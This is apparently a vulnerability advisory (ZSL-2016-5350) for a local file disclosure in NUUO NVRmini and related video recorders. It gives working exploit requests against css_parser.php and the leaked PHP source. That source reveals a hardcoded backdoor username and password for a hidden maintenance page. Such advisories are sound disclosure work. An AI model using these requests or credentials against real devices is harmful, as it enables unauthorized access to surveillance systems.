@@ -1,0 +1,154 @@
+﻿NUUO Local File Disclosure Vulnerability
+
+
+Vendor: NUUO Inc.
+Product web page: http://www.nuuo.com
+Affected version: <=3.0.8 (NE-4160, NT-4040)
+
+Summary: NUUO NVRmini 2 is the lightweight, portable NVR solution with NAS
+functionality. Setup is simple and easy, with automatic port forwarding
+settings built in. NVRmini 2 supports POS integration, making this the perfect
+solution for small retail chain stores. NVRmini 2 also comes full equipped as
+a NAS, so you can enjoy the full storage benefits like easy hard drive hot-swapping
+and RAID functions for data protection. Choose NVR and know that your valuable video
+data is safe, always.
+
+Desc: NUUO NVRmini, NVRmini2, Crystal and NVRSolo suffers from a file disclosure
+vulnerability when input passed thru the 'css' parameter to 'css_parser.php' script
+is not properly verified before being used to include files. This can be exploited
+to disclose contents of files from local resources.
+
+
+Tested on: GNU/Linux 3.0.8 (armv7l)
+           GNU/Linux 2.6.31.8 (armv5tel)
+           lighttpd/1.4.28
+           PHP/5.5.3
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2016-5350
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5350.php
+
+
+14.01.2016
+
+--
+
+
+Request:
+--------
+GET http://10.0.0.17/css_parser.php?css=__nvr_dat_tool___.php HTTP/1.1
+
+
+Response:
+---------
+
+<?php
+include('utils.php');
+header("Expires: Thu, 19 Nov 1981 08:52:00 GMT");
+header("Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0");
+header("Pragma: no-cache");
+
+session_start();
+?>
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>DatTool</title>
+</head>
+<body>
+<?php
+if (isset($_POST) && isset($_POST['username']) && isset($_POST['password']))
+{
+    if ($_POST['username'] != 'nuuoeng' || $_POST['password'] != 'qwe23622260')
+    {
+        exit(0);
+    }
+
+    if (isset($_POST['act']) && $_POST['act'] == 'checkdat')
+    {
+        echo '<script language="javascript">';
+        echo 'alert("The system will start to repair videos right after system reboot. Please go to Setting Page to reboot system manually.")';
+        echo '</script>';
+        touch(constant("FLASH_FOLDER")."/checkdat");
+    }
+?>
+
+<p>Click the Repair button to repair the recorded videos became black due to incorrect video format. It may take a long time to repair videos, which depends on the amount of video files.</p>
+<form method="POST" action="<?php echo $_SERVER['PHP_SELF']; ?>" name="form0">
+<input type="hidden" name="username" value="<?php echo $_POST['username']; ?>">
+<input type="hidden" name="password" value="<?php echo htmlspecialchars( $_POST['password'] ); ?>">
+<input type="hidden" name="act"      value="checkdat">
+<input type="submit" value="Repair" name="submit" >
+</form>
+
+<?php
+}
+else
+{
+?>
+<form method="POST" action="<?php echo $_SERVER['PHP_SELF']; ?>" name="form0">
+Usermame: <input type="text" size="15" name="username" value=""><br />
+Password: <input type="password" size="15" name="password" value=""><br />
+<input type="submit" value="Submit" name="submit" >
+</form>
+<?php
+}
+
+?>
+
+</body>
+</html>
+
+
+============================================================================
+
+Request:
+--------
+
+GET http://10.0.0.17/css_parser.php?css=css_parser.php HTTP/1.1
+
+
+Response:
+---------
+
+<?php
+
+if(!isset($_GET['css']))exit('/* please supply a "css" parameter */');
+$filename=$_GET['css'];
+
+if(strpos($filename,'..')!==false)exit('/* please use an absolute address for your css */');
+$filename=$_SERVER['DOCUMENT_ROOT'].'/'.$filename;
+if(!file_exists($filename))exit('/* referred css file does not exist */');
+
+header('content-type:text/css');
+header("Expires: ".gmdate("D, d M Y H:i:s", (time()+900)) . " GMT");
+
+$matches=array();
+$names=array();
+$values=array();
+$file=file_get_contents($filename);
+foreach   ($_GET as $key=>$value)  
+{
+    //echo   "Key: $key; Value: $value <br/>\n ";
+    if ($key != 'css')
+    {
+        $file = str_replace($key,$value,$file);
+    }
+    //system("echo \"Key: $key; Value: $value <br/>\n \" >> $filename");
+} 
+
+echo $file;
+
+/*
+foreach(array_reverse($matches[0]) as $match){
+  $match=preg_replace('/\s+/',' ',rtrim(ltrim($match)));
+  $names[]=preg_replace('/\s.*//*','',$match);
+  $values[]=preg_replace('/^[^\s]*\s/','',$match);
+}
+*/
+
+?>
